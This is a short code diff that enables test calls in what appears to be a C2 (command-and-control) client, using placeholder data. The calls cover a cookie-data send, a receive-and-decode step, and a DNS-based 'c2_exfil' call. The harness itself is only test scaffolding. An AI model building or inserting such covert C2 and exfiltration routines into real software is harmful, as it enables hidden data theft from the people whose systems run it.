@@ -32,26 +32,27 @@ int main() {
 
 
     // Test send cookie data
-    // char* data = "!text to base64 encode!";
-    // len = c2_send(data, strlen(data));
-    // if (len == 0) {
-    //     c2_log("[!] cookie send failed\n");
-    //     return -1;
-    // }
+    char* data = "!text to base64 encode!";
+    len = c2_send(data, strlen(data));
+    if (len == 0) {
+        c2_log("[!] cookie send failed\n");
+        return -1;
+    }
 
 
-    // // Test recieve data
-    // len = c2_recv(buffer, 1024);
-    // if (len == 0) {
-    //     c2_log("[!] data recv failed\n");
-    // }
-    // else {
-    //     c2_log("[+] DECODED: %s\n", buffer);
-    // }
+    // Test recieve data
+    len = c2_recv(buffer, 1024);
+    if (len == 0) {
+        c2_log("[!] data recv failed\n");
+    }
+    else {
+        c2_log("[+] DECODED: %s\n", buffer);
+    }
 
 
     // Test DNS
-    c2_send2("AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCDSAFSRFESEFESC12345135234", 103);
+    c2_exfil("AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB", 32);
+    
 
 
 
